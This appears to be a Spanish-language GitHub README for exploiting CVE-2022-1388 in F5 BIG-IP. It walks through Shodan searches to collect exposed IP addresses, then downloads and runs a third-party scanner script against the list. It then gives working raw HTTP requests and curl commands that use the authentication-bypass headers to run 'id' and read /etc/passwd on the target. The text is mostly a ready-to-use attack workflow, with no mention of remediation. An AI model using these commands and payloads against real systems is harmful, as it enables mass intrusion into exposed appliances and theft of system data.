


# F5 BIG-IP RCE (CVE-2022-1388)

## Uso de Shodan

Instalar shodan
```
apt-get update
apt-get install python3-shodan
shodan init YOUR_API_KEY
```
Búsquedas con Shodan
```
shodan host 189.201.128.250
```
![image](https://user-images.githubusercontent.com/50930193/167529480-c88aee9f-7803-4515-b6f0-41b88d21fc2a.png)

Empleemos filtros
```
port:3389 country:pe
```
![image](https://user-images.githubusercontent.com/50930193/167530446-b33a9370-52f5-4aa2-95e0-2ddb47db364d.png)

Ahora en consola
```
shodan download search port:3389 country:pe
```
![image](https://user-images.githubusercontent.com/50930193/167530853-3b66891a-7e20-4911-8eb0-3a8f1cb9dab5.png)

```
shodan convert search.json.gz csv 
cat search.csv | more 
```

![image](https://user-images.githubusercontent.com/50930193/167531063-d1d2642f-c7d6-4ca8-b3e3-948e1850b1c8.png)

Ingresemos a la consola web y busquemos IPs con BigIP F5, para ello empleen el predicado siguiente:
```
http.title:BIG-IP&reg:-Redirect
```

![image](https://user-images.githubusercontent.com/50930193/167530202-088dc976-b8a6-408b-828f-e1ce88b1b091.png)

## Ubicar IPs vulnerables con F5
Los sitios son F5 tienen el título de BIG-IP&reg:-Redirect en su cabecera
```
shodan search 'http.title:BIG-IP&reg:-Redirect' --fields ip_str --separator " " | awk '{print $1}' | cat > IPs.txt
```
Descargar el escaner de detección de vulnerabilidad

```
wget https://raw.githubusercontent.com/trhacknon/CVE-2022-1388-RCE-checker/main/CVE-2022-1388.sh 
chmod +x CVE-2022-1388.sh
./CVE-2022-1388.sh IPs.txt
```
![image](https://user-images.githubusercontent.com/50930193/167532563-066e4630-ea45-452d-b228-efb6fc19f62c.png)

## Explotando vulnerabilidad
POST (1): 
![poc_id](https://user-images.githubusercontent.com/3140111/167375637-54878b95-0897-4ae6-92e0-60ab4cac5c62.png)
```ruby
POST /mgmt/tm/util/bash HTTP/1.1
Host: <redacted>:8443
Authorization: Basic YWRtaW46
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: 0

{"command": "run" , "utilCmdArgs": " -c 'id' " }

```
curl commandliner: 
```ruby
$ curl -i -s -k -X $'POST'
-H $'Host: <redacted>:8443' 
-H $'Authorization: Basic YWRtaW46' 
-H $'Connection: keep-alive, X-F5-Auth-Token' 
-H $'X-F5-Auth-Token: 0' 
-H $'Content-Length: 52' 
--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \'id\' \" }\x0d\x0a'
$'https://<redacted>:8443/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080
```
POST (2):
![poc_pass](https://user-images.githubusercontent.com/3140111/167375725-2a5403c1-f99a-427a-b99a-a18bc8f7f54c.png)
```ruby
POST /mgmt/tm/util/bash HTTP/1.1
Host: <redateced>:8443
Authorization: Basic YWRtaW46
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: 0

{"command": "run" , "utilCmdArgs": " -c ' cat /etc/passwd' " }

```
curl commandliner:
```ruby
$ curl -i -s -k -X $'POST'
-H $'Host: <redacted>:8443' 
-H $'Authorization: Basic YWRtaW46' -H $'Connection: keep-alive, X-F5-Auth-Token' 
-H $'X-F5-Auth-Token: 0'
--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \' cat /etc/passwd\' \" }\x0d\x0a\x0d\x0a'
$'https://<redacted>/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080
``` 
